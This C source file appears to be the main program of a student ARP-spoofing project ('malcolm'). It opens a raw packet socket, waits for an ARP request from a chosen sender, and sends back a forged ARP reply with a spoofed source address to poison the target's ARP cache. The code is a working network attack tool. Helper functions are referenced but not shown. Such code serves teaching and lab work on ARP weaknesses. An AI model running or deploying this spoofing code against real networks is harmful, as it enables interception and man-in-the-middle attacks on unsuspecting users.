#include "malcolm.h"

int g_signal = 0;

void ctrlC(int signum) {
  (void)signum;
  g_signal = 1;
}

// TODO: signal

int main(int argc, char **argv) {

  if (argc < 5 || argc > 6) {
    dprintf(2, "Wrong number of arguments\n");
    return (printExpectedInput(), 0);
  }

  struct s_input input;
  if (!check_args(argv, &input, argc - 5) || !checkInterface(&input))
    return (0);

  signal(SIGINT, ctrlC);

  if (input.verbose)
    printf("\e[34m[ Opening socket ]\n\e[0m");
  int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sockfd == -1) {
    dprintf(2, "Error opening socket\n");
    return (0);
  }

  // Timeout for signal
  struct timeval tv;
  tv.tv_sec = 1; // 1 seconde
  tv.tv_usec = 0;

  if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
    return (perror("setsockopt"), 0);

  if (input.verbose)
    printf("\e[34m[ Waiting for an ARP request ]\n\e[0m");
  int numbytes = 0;
  char buffer[1000];
  while (1) {
    numbytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
    if (numbytes < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) {
        if (g_signal == 1)
          return (close(sockfd), 0);
        continue;
      }
      perror("recvfrom");
      break;
    }
    printf("AN ARP request has been broadcast\n");
    if (parse_packet(buffer, input))
      // Break if the request come from the rigth sender
      break;
  }

  // Create ARP response
  if (input.verbose)
    printf("\e[34m[ Creating ARP reply ]\n\e[0m");
  unsigned char responseBuf[42];
  createResponse(input, responseBuf);

  printf("Now sending an ARP reply to the target address with spoofed source, "
         "please wait...\n");
  // Send ARP response
  struct sockaddr_ll addr; // Structure attendue au niveau trames Ethernet
  ft_memset(&addr, 0, sizeof(addr));
  addr.sll_family = AF_PACKET;
  addr.sll_protocol = htons(ETH_P_ARP);
  // Precise de l'envoyer sur l'interface qui correpond au bon reseau
  addr.sll_ifindex = input.interIndex;
  addr.sll_halen = 6;
  ft_memcpy(addr.sll_addr, input.in_tha, 6);

  if (sendto(sockfd, responseBuf,
             sizeof(struct ethhdr) + sizeof(struct arp_eth_ipv4), 0,
             (struct sockaddr *)&addr, sizeof(struct sockaddr_ll)) == -1)
    return (perror("sendto"), close(sockfd), 0);
  close(sockfd);
  printf("Sent an ARP reply packet, you may now check the arp table on the "
         "target.\nExiting program..\n");

  return (0);
}

// socket
// AF_INET if you want to communicate with TCP or UDP
// PF_PACKET if you want to send and receive at the most basic level
//
// SOCK_RAW : trames brutes (sans traitement)
//
// ETH_P_ARP : macro, pour ne recevoir que celles dont EtherType = ARP
